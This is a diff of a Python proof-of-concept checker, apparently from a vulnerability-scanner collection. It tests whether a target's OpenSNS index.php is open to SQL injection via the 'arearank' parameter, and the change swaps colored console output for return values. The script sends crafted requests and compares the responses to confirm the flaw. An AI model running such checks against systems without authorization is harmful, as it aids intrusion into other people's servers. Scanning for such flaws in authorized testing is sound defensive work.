@@ -8,8 +8,8 @@ description: 文件index.php中,参数arearank存在SQL注入。
 '''
 import sys
 import requests
-import warnings
-from termcolor import cprint
+
+
 
 class opensns_index_arearank_BaseVerify:
     def __init__(self, url):
@@ -26,12 +26,12 @@ class opensns_index_arearank_BaseVerify:
             req1 = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
             req2 = requests.get(vulnurl2, headers=headers, timeout=10, verify=False)
             if r"arearank/131000/arealv/2" in req1.text and r"arearank/131000/arealv/2" not in req2.text:
-                cprint("[+]存在opensns index.php 参数arearank注入漏洞...(高危)\tpayload: "+vulnurl, "red")
+                return "[+]存在opensns index.php 参数arearank注入漏洞...(高危)\tpayload: "+vulnurl
 
         except:
-            cprint("[-] "+__file__+"====>连接超时", "cyan")
+            return "[-]connect timeout"
 
 if __name__ == "__main__":
-    warnings.filterwarnings("ignore")
+
     testVuln = opensns_index_arearank_BaseVerify(sys.argv[1])
     testVuln.run()
